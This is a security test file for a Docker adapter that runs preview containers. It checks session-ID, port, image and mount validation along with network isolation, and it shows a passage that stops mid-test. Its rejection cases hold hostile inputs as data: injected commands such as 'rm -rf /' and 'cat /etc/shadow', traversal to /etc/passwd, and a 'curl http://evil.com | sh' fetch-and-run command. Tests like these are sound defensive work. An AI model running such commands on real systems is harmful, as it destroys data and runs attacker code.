import { describe, it, expect, vi } from 'vitest';
import { EventEmitter } from 'node:events';

import {
  DockerAdapter,
  DockerErrorCode,
  DockerAdapterError,
  ContainerProfile,
  CONTAINER_PROFILES,
  sanitizeOutput,
  APPROVED_ROLES,
  APPROVED_IMAGES,
  APPROVED_MOUNT_TARGETS,
} from '../src/modules/preview/dockerAdapter.js';

// Helper to create a controllable mock child process
function createMockChildProcess({
  exitCode = 0,
  stdout = '',
  stderr = '',
  delayMs = 0,
  emitError = null,
} = {}) {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.kill = vi.fn((signal) => {
    setTimeout(() => {
      child.emit('close', signal === 'SIGKILL' ? 137 : 143);
    }, 5);
  });

  setTimeout(() => {
    if (emitError) {
      child.emit('error', emitError);
      return;
    }

    if (stdout) {
      child.stdout.emit('data', Buffer.from(stdout, 'utf8'));
    }
    if (stderr) {
      child.stderr.emit('data', Buffer.from(stderr, 'utf8'));
    }

    child.emit('close', exitCode);
  }, delayMs);

  return child;
}

// Helper to create mock spawn factory
function createMockSpawn(defaultConfig = { exitCode: 0, stdout: '', stderr: '' }) {
  const calls = [];
  const handlers = [];

  const spawnFn = (command, args, options) => {
    calls.push({ command, args, options });
    let config = defaultConfig;

    for (const handler of handlers) {
      const match = handler.matcher(args);
      if (match) {
        config = typeof handler.response === 'function' ? handler.response(args) : handler.response;
        break;
      }
    }

    return createMockChildProcess(config);
  };

  spawnFn.calls = calls;
  spawnFn.onArgs = (matcher, response) => {
    handlers.push({ matcher, response });
  };

  return spawnFn;
}

const VALID_UUID = '12345678-1234-4234-8234-123456789abc';
const OTHER_UUID = '87654321-4321-4321-8321-cba987654321';

describe('DockerAdapter Security Hardening & Unit Tests', () => {
  describe('Input Validation & Argument Injection Defenses', () => {
    const adapter = new DockerAdapter();

    it('accepts valid standard UUID session IDs', () => {
      expect(adapter.validateSessionId(VALID_UUID)).toBe(VALID_UUID);
      expect(adapter.validateSessionId(OTHER_UUID)).toBe(OTHER_UUID);
    });

    it.each([
      ['empty string', ''],
      ['arbitrary word', 'invalid-session'],
      ['flag injection attempt', '--privileged'],
      ['path traversal attempt', '../../etc/passwd'],
      ['shell metacharacter semicolon', `${VALID_UUID};rm -rf /`],
      ['shell metacharacter pipe', `${VALID_UUID}|cat /etc/shadow`],
      ['spaces in UUID', `${VALID_UUID} `],
      ['non-hex characters', '12345678-1234-4234-8234-123456789xyz'],
    ])('rejects invalid session ID: %s', (_, badSessionId) => {
      expect(() => adapter.validateSessionId(badSessionId)).toThrowError(DockerAdapterError);
      try {
        adapter.validateSessionId(badSessionId);
      } catch (err) {
        expect(err.errorCode).toBe(DockerErrorCode.DOCKER_INVALID_ARGUMENT);
      }
    });

    it('accepts valid resource names', () => {
      expect(adapter.validateResourceName('gitview-net-123')).toBe('gitview-net-123');
      expect(adapter.validateResourceName(`gitview-ws-${VALID_UUID}`)).toBe(`gitview-ws-${VALID_UUID}`);
      expect(adapter.validateResourceName('gitview-runner-session-1_test')).toBe('gitview-runner-session-1_test');
    });

    it.each([
      ['does not start with gitview-', 'custom-container'],
      ['starts with flag dash', '-v'],
      ['starts with double flag dash', '--net=host'],
      ['contains space', 'gitview-net test'],
      ['contains uppercase', 'gitview-NET-123'],
      ['contains shell injection', 'gitview-net;reboot'],
      ['empty string', ''],
      ['plain gitview-', 'gitview-'],
    ])('rejects invalid resource name: %s', (_, badName) => {
      expect(() => adapter.validateResourceName(badName)).toThrowError(DockerAdapterError);
      try {
        adapter.validateResourceName(badName);
      } catch (err) {
        expect(err.errorCode).toBe(DockerErrorCode.DOCKER_INVALID_ARGUMENT);
      }
    });

    it.each([1024, 3000, 8080, 65535])('accepts valid TCP port %i', (port) => {
      expect(adapter.validatePort(port)).toBe(port);
    });

    it.each([
      ['privileged port 80', 80],
      ['port 0', 0],
      ['negative port', -1],
      ['port exceeding 65535', 70000],
      ['non-numeric string', 'abc'],
      ['port with flag injection', '--port=8080'],
    ])('rejects invalid port: %s', (_, badPort) => {
      expect(() => adapter.validatePort(badPort)).toThrowError(DockerAdapterError);
      try {
        adapter.validatePort(badPort);
      } catch (err) {
        expect(err.errorCode).toBe(DockerErrorCode.DOCKER_INVALID_ARGUMENT);
      }
    });

    it('accepts approved roles and rejects unapproved roles', () => {
      for (const role of APPROVED_ROLES) {
        expect(adapter.validateRole(role)).toBe(role);
      }
      expect(() => adapter.validateRole('admin')).toThrowError(DockerAdapterError);
      expect(() => adapter.validateRole('root')).toThrowError(DockerAdapterError);
      expect(() => adapter.validateRole('--role=runner')).toThrowError(DockerAdapterError);
    });

    it('accepts approved container profiles and rejects unapproved profiles', () => {
      for (const profile of Object.values(ContainerProfile)) {
        expect(adapter.validateProfile(profile)).toBe(profile);
      }
      expect(() => adapter.validateProfile('CUSTOM_PROFILE')).toThrowError(DockerAdapterError);
      expect(() => adapter.validateProfile('ROOT')).toThrowError(DockerAdapterError);
    });
  });

  describe('Immutable Image Allowlist & Tag Policy', () => {
    const adapter = new DockerAdapter();

    it('accepts correct immutable GitView image references', () => {
      for (const img of APPROVED_IMAGES) {
        expect(adapter.validateImage(img)).toBe(img);
      }
      expect(APPROVED_IMAGES).toContain('gitview-preview-runner:v1.0.0');
      expect(APPROVED_IMAGES).toContain('gitview-preview-extractor:v1.0.0');
    });

    it.each([
      ['mutable :latest tag', 'gitview-runner:latest'],
      ['mutable extractor :latest tag', 'gitview-extractor:latest'],
      ['third party :latest tag', 'node:22-alpine'],
      ['alpine :latest tag', 'alpine:latest'],
      ['nginx :alpine mutable tag', 'nginx:alpine'],
      ['mutable :edge tag', 'alpine:edge'],
      ['mutable :main tag', 'myrepo:main'],
      ['unversioned image', 'alpine'],
    ])('rejects mutable or unversioned image: %s', (_, mutableImg) => {
      expect(() => adapter.validateImage(mutableImg)).toThrowError(DockerAdapterError);
      try {
        adapter.validateImage(mutableImg);
      } catch (err) {
        expect(
          err.errorCode === DockerErrorCode.DOCKER_SECURITY_POLICY_VIOLATION ||
          err.errorCode === DockerErrorCode.DOCKER_INVALID_ARGUMENT
        ).toBe(true);
      }
    });

    it('rejects unknown images even with versioned tags', () => {
      expect(() => adapter.validateImage('ubuntu:22.04')).toThrowError(DockerAdapterError);
      expect(() => adapter.validateImage('redis:7.0.0')).toThrowError(DockerAdapterError);
    });

    it('accepts pinned image digests with @sha256:', () => {
      const digestImg = 'node@sha256:e9f565d32859c2357732a392e2b34a6ef539a2d2f7823f5b7cb34f68b3f20e40';
      expect(adapter.validateImage(digestImg)).toBe(digestImg);
    });
  });

  describe('Container Profile Governance & Execution Restrictions', () => {
    it('spawns STATIC_RUNNER using fixed profile settings and immutable image', async () => {
      const mockSpawn = createMockSpawn();

      // Mock network inspect showing internal network
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        {
          exitCode: 0,
          stdout: JSON.stringify([{ Name: `gitview-net-${VALID_UUID}`, Internal: true, Labels: { 'com.gitview.session-id': VALID_UUID } }]),
        }
      );
      mockSpawn.onArgs((args) => args[0] === 'run', { exitCode: 0, stdout: 'c-runner-123' });

      const adapter = new DockerAdapter({ spawnFn: mockSpawn });
      const res = await adapter.createAndStartContainer({
        profile: ContainerProfile.STATIC_RUNNER,
        sessionId: VALID_UUID,
        networkName: `gitview-net-${VALID_UUID}`,
        volumeMount: {
          volumeName: `gitview-ws-${VALID_UUID}`,
          mountPath: '/app/workspace',
          readOnly: true,
        },
      });

      expect(res.containerId).toBe('c-runner-123');
      expect(res.containerName).toBe(`gitview-runner-${VALID_UUID}`);

      const runCall = mockSpawn.calls.find((c) => c.args[0] === 'run');
      expect(runCall).toBeDefined();
      expect(runCall.args).toContain('gitview-preview-runner:v1.0.0');
      expect(runCall.args).toContain('--security-opt=no-new-privileges');
      expect(runCall.args).toContain('--cap-drop=ALL');
      expect(runCall.args).toContain('--user');
      expect(runCall.args).toContain('10001:10001');
      expect(runCall.args).toContain(`gitview-ws-${VALID_UUID}:/app/workspace:ro`);
      expect(runCall.args).toContain('node');
      expect(runCall.args).toContain('/usr/local/bin/gitview-serve.js');
    });

    it('rejects arbitrary commands supplied by caller', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Internal: true }]) }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: {
            volumeName: `gitview-ws-${VALID_UUID}`,
            mountPath: '/app/workspace',
            readOnly: true,
          },
          command: ['sh', '-c', 'curl http://evil.com | sh'],
        })
      ).rejects.toThrowError(/Arbitrary command execution is forbidden/);
    });

    it('rejects path traversal and absolute paths in projectRoot', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Internal: true }]) }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.VITE_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: {
            volumeName: `gitview-ws-${VALID_UUID}`,
            mountPath: '/workspace',
            readOnly: false,
          },
          projectRoot: '../outside',
        })
      ).rejects.toThrowError(/path traversal or absolute path detected/);

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: {
            volumeName: `gitview-ws-${VALID_UUID}`,
            mountPath: '/workspace',
            readOnly: true,
          },
          projectRoot: '/etc/passwd',
        })
      ).rejects.toThrowError(/path traversal or absolute path detected/);
    });

    it('adapts command and workdir safely for nested projectRoot', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0, stdout: 'c-nested-123' });
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Internal: true }]) }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await adapter.createAndStartContainer({
        profile: ContainerProfile.VITE_RUNNER,
        sessionId: VALID_UUID,
        networkName: `gitview-net-${VALID_UUID}`,
        volumeMount: {
          volumeName: `gitview-ws-${VALID_UUID}`,
          mountPath: '/workspace',
          readOnly: false,
        },
        projectRoot: 'vite-project',
      });

      const runCall = mockSpawn.calls.find((c) => c.args[0] === 'run');
      expect(runCall).toBeDefined();
      expect(runCall.args).toContain('--workdir');
      expect(runCall.args).toContain('/workspace/vite-project');
      expect(runCall.args).toContain('/workspace/vite-project/node_modules/.bin/vite');
      expect(runCall.args).toContain('/workspace/vite-project');
    });

    it('rejects arbitrary environment variables not in profile allowlist', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Internal: true }]) }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: {
            volumeName: `gitview-ws-${VALID_UUID}`,
            mountPath: '/app/workspace',
            readOnly: true,
          },
          env: {
            AWS_SECRET_ACCESS_KEY: 'secret123',
          },
        })
      ).rejects.toThrowError(/Arbitrary environment variable 'AWS_SECRET_ACCESS_KEY' is forbidden/);
    });

    it('rejects invalid mount destinations for profile', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Internal: true }]) }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: {
            volumeName: `gitview-ws-${VALID_UUID}`,
            mountPath: '/etc', // invalid destination
            readOnly: true,
          },
        })
      ).rejects.toThrowError(/Invalid mount destination/);
    });

    it('spawns NPM_BUILDER using gitview-preview-builder:v1.0.0 and internal build network', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        { exitCode: 0, stdout: JSON.stringify([{ Name: `gitview-build-int-${VALID_UUID}`, Internal: true, Labels: { 'com.gitview.session-id': VALID_UUID } }]) }
      );
      mockSpawn.onArgs((args) => args[0] === 'run', { exitCode: 0, stdout: 'c-builder-123' });

      const adapter = new DockerAdapter({ spawnFn: mockSpawn });
      const res = await adapter.createAndStartContainer({
        profile: ContainerProfile.NPM_BUILDER,
        sessionId: VALID_UUID,
        networkName: `gitview-build-int-${VALID_UUID}`,
        volumeMount: {
          volumeName: `gitview-ws-${VALID_UUID}`,
          mountPath: '/workspace',
          readOnly: false,
        },
      });

      expect(res.containerId).toBe('c-builder-123');
      const runCall = mockSpawn.calls.find((c) => c.args[0] === 'run');
      expect(runCall.args).toContain('gitview-preview-builder:v1.0.0');
      expect(runCall.args).toContain('--read-only');
      expect(runCall.args).toContain('--tmpfs');
      expect(runCall.args).toContain('/tmp:rw,noexec,nosuid,size=256m');
      expect(runCall.args).toContain(`gitview-ws-${VALID_UUID}:/workspace:rw`);
    });

    it('spawns EGRESS_PROXY and connects egress network with gwPriority 1', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs((args) => args[0] === 'run', { exitCode: 0, stdout: 'c-proxy-456' });
      mockSpawn.onArgs((args) => args[0] === 'network' && args[1] === 'connect', { exitCode: 0 });

      const adapter = new DockerAdapter({ spawnFn: mockSpawn });
      const res = await adapter.createAndStartContainer({
        profile: ContainerProfile.EGRESS_PROXY,
        sessionId: VALID_UUID,
        internalNetworkName: `gitview-build-int-${VALID_UUID}`,
        egressNetworkName: `gitview-build-egress-${VALID_UUID}`,
      });

      expect(res.containerId).toBe('c-proxy-456');
      const connectCall = mockSpawn.calls.find((c) => c.args[0] === 'network' && c.args[1] === 'connect');
      expect(connectCall).toBeDefined();
      expect(connectCall.args).toContain('--gw-priority');
      expect(connectCall.args).toContain('1');
      expect(connectCall.args).toContain(`gitview-build-egress-${VALID_UUID}`);
    });

    it('inspects container routing table and verifies default gateway', async () => {
      const mockSpawn = createMockSpawn({
        exitCode: 0,
        stdout: 'default via 172.29.0.1 dev eth1\n172.28.0.0/16 dev eth0 scope link\n172.29.0.0/16 dev eth1 scope link',
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const routes = await adapter.getContainerRoutes(`gitview-build-proxy-${VALID_UUID}`);
      expect(routes).toHaveLength(3);
      expect(routes[0]).toBe('default via 172.29.0.1 dev eth1');

      const verified = await adapter.verifyProxyDefaultGateway(`gitview-build-proxy-${VALID_UUID}`, '172.29.0.1');
      expect(verified.valid).toBe(true);
      expect(verified.defaultRoute).toContain('172.29.0.1');
    });
  });

  describe('Network Attachment Policy Enforcement', () => {
    it('rejects RUNNER attachment to non-internal external network', async () => {
      const mockSpawn = createMockSpawn();
      // External network (Internal: false)
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        {
          exitCode: 0,
          stdout: JSON.stringify([{ Name: `gitview-wan-${VALID_UUID}`, Internal: false, Labels: { 'com.gitview.session-id': VALID_UUID } }]),
        }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-wan-${VALID_UUID}`,
          volumeMount: { volumeName: `gitview-ws-${VALID_UUID}`, mountPath: '/app/workspace', readOnly: true },
        })
      ).rejects.toThrowError(/RUNNER container cannot attach to external network/);
    });

    it('rejects BUILDER attachment to non-internal external network via enforceNetworkPolicy', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        {
          exitCode: 0,
          stdout: JSON.stringify([{ Name: `gitview-wan-${VALID_UUID}`, Internal: false, Labels: { 'com.gitview.session-id': VALID_UUID } }]),
        }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.enforceNetworkPolicy('builder', `gitview-wan-${VALID_UUID}`, VALID_UUID)
      ).rejects.toThrowError(/BUILDER container cannot attach to external network/);
    });

    it('rejects EXTRACTOR network attachment', async () => {
      const adapter = new DockerAdapter({ spawnFn: createMockSpawn() });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.EXTRACTOR,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`, // Network requested on extractor!
          volumeMount: { volumeName: `gitview-ws-${VALID_UUID}`, mountPath: '/workspace' },
        })
      ).rejects.toThrowError(/Network attachment is forbidden for profile 'EXTRACTOR'/);

      await expect(
        adapter.enforceNetworkPolicy('extractor', `gitview-net-${VALID_UUID}`, VALID_UUID)
      ).rejects.toThrowError(/EXTRACTOR container cannot be connected to any network/);
    });

    it('allows TRUSTED_PROXY attachment to dual networks (ingress bridge + internal preview)', async () => {
      const mockSpawn = createMockSpawn();

      // Handlers for network inspections
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect' && args.includes(`gitview-net-${VALID_UUID}`),
        { exitCode: 0, stdout: JSON.stringify([{ Name: `gitview-net-${VALID_UUID}`, Internal: true, Labels: { 'com.gitview.session-id': VALID_UUID } }]) }
      );
      mockSpawn.onArgs((args) => args[0] === 'run', { exitCode: 0, stdout: 'c-proxy-123' });
      mockSpawn.onArgs((args) => args[0] === 'network' && args[1] === 'connect', { exitCode: 0 });

      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const res = await adapter.createAndStartContainer({
        profile: ContainerProfile.TRUSTED_PROXY,
        sessionId: VALID_UUID,
        ingressNetworkName: `gitview-ingress-net-${VALID_UUID}`,
        internalNetworkName: `gitview-net-${VALID_UUID}`,
        portMapping: { containerPort: 8080 },
      });

      expect(res.containerId).toBe('c-proxy-123');

      // Verify started on ingress network
      const runCall = mockSpawn.calls.find((c) => c.args[0] === 'run');
      expect(runCall.args).toContain('--network');
      expect(runCall.args).toContain(`gitview-ingress-net-${VALID_UUID}`);

      // Verify secondary network connection call
      const connectCall = mockSpawn.calls.find((c) => c.args[0] === 'network' && c.args[1] === 'connect');
      expect(connectCall).toBeDefined();
      expect(connectCall.args).toEqual([
        'network',
        'connect',
        `gitview-net-${VALID_UUID}`,
        `gitview-proxy-${VALID_UUID}`,
      ]);
    });

    it('rejects cross-session network attachment', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'inspect',
        {
          exitCode: 0,
          stdout: JSON.stringify([{ Name: `gitview-net-${OTHER_UUID}`, Internal: true, Labels: { 'com.gitview.session-id': OTHER_UUID } }]),
        }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.enforceNetworkPolicy('runner', `gitview-net-${OTHER_UUID}`, VALID_UUID)
      ).rejects.toThrowError(/Cross-session network attachment is forbidden/);
    });
  });

  describe('Port Publishing Policy Enforcement', () => {
    it('strictly rejects host port exposure on 0.0.0.0', async () => {
      const adapter = new DockerAdapter({ spawnFn: createMockSpawn() });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.TRUSTED_PROXY,
          sessionId: VALID_UUID,
          ingressNetworkName: `gitview-ingress-net-${VALID_UUID}`,
          portMapping: {
            containerPort: 8080,
            hostIp: '0.0.0.0', // Forbidden wildcard host exposure
          },
        })
      ).rejects.toThrowError(/Host port exposure on '0.0.0.0' is forbidden/);
    });

    it('strictly forbids port publishing on non-proxy profiles', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs((args) => args[0] === 'network' && args[1] === 'inspect', {
        exitCode: 0,
        stdout: JSON.stringify([{ Internal: true }]),
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.createAndStartContainer({
          profile: ContainerProfile.STATIC_RUNNER,
          sessionId: VALID_UUID,
          networkName: `gitview-net-${VALID_UUID}`,
          volumeMount: { volumeName: `gitview-ws-${VALID_UUID}`, mountPath: '/app/workspace', readOnly: true },
          portMapping: { containerPort: 3000 }, // Forbidden!
        })
      ).rejects.toThrowError(/Port publishing is forbidden for profile 'STATIC_RUNNER'/);
    });
  });

  describe('Volume & Network Creation Operations', () => {
    it('creates internal network with labels', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0 });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const res = await adapter.createInternalNetwork({
        sessionId: VALID_UUID,
        role: 'runner',
      });
      expect(res.internal).toBe(true);
      expect(res.networkName).toBe(`gitview-net-${VALID_UUID}`);
      expect(mockSpawn.calls[0].args).toContain('--internal');
      expect(mockSpawn.calls[0].args).toContain('com.gitview.managed=true');
    });

    it('creates volume with labels', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0 });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const res = await adapter.createVolume({
        sessionId: VALID_UUID,
        role: 'runner',
      });
      expect(res.volumeName).toBe(`gitview-ws-${VALID_UUID}`);
      expect(mockSpawn.calls[0].args).toContain('com.gitview.managed=true');
    });
  });

  describe('Dynamic Loopback Port Discovery', () => {
    it('retrieves published loopback port from running proxy container', async () => {
      const inspectData = [
        {
          State: { Running: true, Status: 'running' },
          NetworkSettings: {
            Ports: {
              '8080/tcp': [{ HostIp: '127.0.0.1', HostPort: '54321' }],
            },
          },
        },
      ];
      const mockSpawn = createMockSpawn({
        exitCode: 0,
        stdout: JSON.stringify(inspectData),
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const portInfo = await adapter.getPublishedPort({
        containerName: `gitview-proxy-${VALID_UUID}`,
        containerPort: 8080,
      });

      expect(portInfo.hostIp).toBe('127.0.0.1');
      expect(portInfo.hostPort).toBe(54321);
    });

    it('rejects dynamic port if container is not running', async () => {
      const inspectData = [
        {
          State: { Running: false, Status: 'exited' },
          NetworkSettings: { Ports: {} },
        },
      ];
      const mockSpawn = createMockSpawn({
        exitCode: 0,
        stdout: JSON.stringify(inspectData),
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.getPublishedPort({
          containerName: `gitview-proxy-${VALID_UUID}`,
          containerPort: 8080,
        })
      ).rejects.toThrowError(DockerAdapterError);
    });

    it('rejects dynamic port if published to unexpected host IP', async () => {
      const inspectData = [
        {
          State: { Running: true, Status: 'running' },
          NetworkSettings: {
            Ports: {
              '8080/tcp': [{ HostIp: '0.0.0.0', HostPort: '54321' }],
            },
          },
        },
      ];
      const mockSpawn = createMockSpawn({
        exitCode: 0,
        stdout: JSON.stringify(inspectData),
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.getPublishedPort({
          containerName: `gitview-proxy-${VALID_UUID}`,
          containerPort: 8080,
        })
      ).rejects.toThrowError(/Unapproved host IP binding/);
    });
  });

  describe('Scoped Session Cleanup & Resource Isolation', () => {
    it('cleans only resources matching exact session ID and preserves unrelated resources', async () => {
      const mockSpawn = createMockSpawn();

      mockSpawn.onArgs(
        (args) => args[0] === 'ps' && args.includes(`label=com.gitview.session-id=${VALID_UUID}`),
        { exitCode: 0, stdout: 'c-session-1\nc-session-2' }
      );
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args.includes(`label=com.gitview.session-id=${VALID_UUID}`),
        { exitCode: 0, stdout: `gitview-net-${VALID_UUID}` }
      );
      mockSpawn.onArgs(
        (args) => args[0] === 'volume' && args.includes(`label=com.gitview.session-id=${VALID_UUID}`),
        { exitCode: 0, stdout: `gitview-ws-${VALID_UUID}` }
      );

      const adapter = new DockerAdapter({ spawnFn: mockSpawn });
      const report = await adapter.cleanupSession(VALID_UUID);

      expect(report.sessionId).toBe(VALID_UUID);
      expect(report.containersRemoved).toEqual(['c-session-1', 'c-session-2']);
      expect(report.networksRemoved).toEqual([`gitview-net-${VALID_UUID}`]);
      expect(report.volumesRemoved).toEqual([`gitview-ws-${VALID_UUID}`]);
      expect(report.errors).toHaveLength(0);
    });

    it('is idempotent when session has no active resources', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0, stdout: '' });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const report = await adapter.cleanupSession(VALID_UUID);
      expect(report.containersRemoved).toHaveLength(0);
      expect(report.networksRemoved).toHaveLength(0);
      expect(report.volumesRemoved).toHaveLength(0);
      expect(report.errors).toHaveLength(0);
    });
  });

  describe('Process Management & Error Handling', () => {
    it('handles Docker daemon unavailable error with classified code', async () => {
      const mockSpawn = createMockSpawn({
        exitCode: 1,
        stderr: 'Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?',
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(adapter.inspectNetwork(`gitview-net-${VALID_UUID}`)).rejects.toThrowError(DockerAdapterError);
      try {
        await adapter.inspectNetwork(`gitview-net-${VALID_UUID}`);
      } catch (err) {
        expect(err.errorCode).toBe(DockerErrorCode.DOCKER_DAEMON_UNAVAILABLE);
      }
    });

    it('handles command timeout and terminates process', async () => {
      const mockSpawn = createMockSpawn({
        delayMs: 200,
        exitCode: 0,
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn, defaultTimeoutMs: 50 });

      await expect(adapter.inspectContainer(`gitview-runner-${VALID_UUID}`)).rejects.toThrowError(DockerAdapterError);
      try {
        await adapter.inspectContainer(`gitview-runner-${VALID_UUID}`);
      } catch (err) {
        expect(err.errorCode).toBe(DockerErrorCode.DOCKER_COMMAND_TIMEOUT);
      }
    });

    it('bounds captured stdout and stderr buffers', async () => {
      const hugeOutput = 'a'.repeat(2000000); // 2 MB
      const mockSpawn = createMockSpawn({ exitCode: 0, stdout: hugeOutput });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const logs = await adapter.getContainerLogs({ containerName: `gitview-runner-${VALID_UUID}`, maxBytes: 50000 });
      expect(logs.stdout.length).toBeLessThanOrEqual(50000);
    });
  });

  describe('Volume File & Executable Verification Helpers', () => {
    it('readVolumeFile: reads file successfully from volume', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0, stdout: '{"name":"test"}' });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const content = await adapter.readVolumeFile({
        volumeName: `gitview-ws-${VALID_UUID}`,
        filePath: 'package.json',
        sessionId: VALID_UUID,
      });

      expect(content).toBe('{"name":"test"}');
      const lastCall = mockSpawn.calls[mockSpawn.calls.length - 1];
      expect(lastCall.args).toContain('cat');
      expect(lastCall.args).toContain('/workspace/package.json');
      expect(lastCall.args).toContain(`gitview-ws-${VALID_UUID}:/workspace:ro`);
    });

    it('readVolumeFile: returns null when file is not found', async () => {
      const mockSpawn = createMockSpawn({
        exitCode: 1,
        stderr: 'cat: /workspace/missing.json: No such file or directory',
      });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const content = await adapter.readVolumeFile({
        volumeName: `gitview-ws-${VALID_UUID}`,
        filePath: 'missing.json',
        sessionId: VALID_UUID,
      });

      expect(content).toBeNull();
    });

    it('readVolumeFile: rejects path traversal and unsafe path', async () => {
      const adapter = new DockerAdapter();

      await expect(
        adapter.readVolumeFile({
          volumeName: `gitview-ws-${VALID_UUID}`,
          filePath: '../../etc/passwd',
          sessionId: VALID_UUID,
        })
      ).rejects.toThrowError(DockerAdapterError);

      await expect(
        adapter.readVolumeFile({
          volumeName: `gitview-ws-${VALID_UUID}`,
          filePath: 'safe/../../secret',
          sessionId: VALID_UUID,
        })
      ).rejects.toThrowError(DockerAdapterError);
    });

    it('verifyVolumeExecutable: returns true for valid executable', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 0 });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const result = await adapter.verifyVolumeExecutable({
        volumeName: `gitview-ws-${VALID_UUID}`,
        filePath: 'node_modules/.bin/vite',
        sessionId: VALID_UUID,
      });

      expect(result).toBe(true);
      const lastCall = mockSpawn.calls[mockSpawn.calls.length - 1];
      expect(lastCall.args).toContain('test');
      expect(lastCall.args).toContain('-x');
      expect(lastCall.args).toContain('/workspace/node_modules/.bin/vite');
    });

    it('verifyVolumeExecutable: returns false for missing or non-executable file', async () => {
      const mockSpawn = createMockSpawn({ exitCode: 1, stderr: 'test: not executable' });
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const result = await adapter.verifyVolumeExecutable({
        volumeName: `gitview-ws-${VALID_UUID}`,
        filePath: 'not-an-executable',
        sessionId: VALID_UUID,
      });

      expect(result).toBe(false);
    });

    it('waitForContainer: returns exit code and status when container terminates', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args.includes('inspect') && args.includes(`gitview-builder-${VALID_UUID}`),
        {
          exitCode: 0,
          stdout: JSON.stringify([{
            State: { Running: false, ExitCode: 0, OOMKilled: false, Status: 'exited' },
          }]),
        }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const result = await adapter.waitForContainer({
        containerName: `gitview-builder-${VALID_UUID}`,
        timeoutMs: 5000,
        pollIntervalMs: 50,
      });

      expect(result).toEqual({ exitCode: 0, oomKilled: false, status: 'exited' });
    });

    it('waitForContainer: throws timeout error when container does not exit in time', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args.includes('inspect'),
        {
          exitCode: 0,
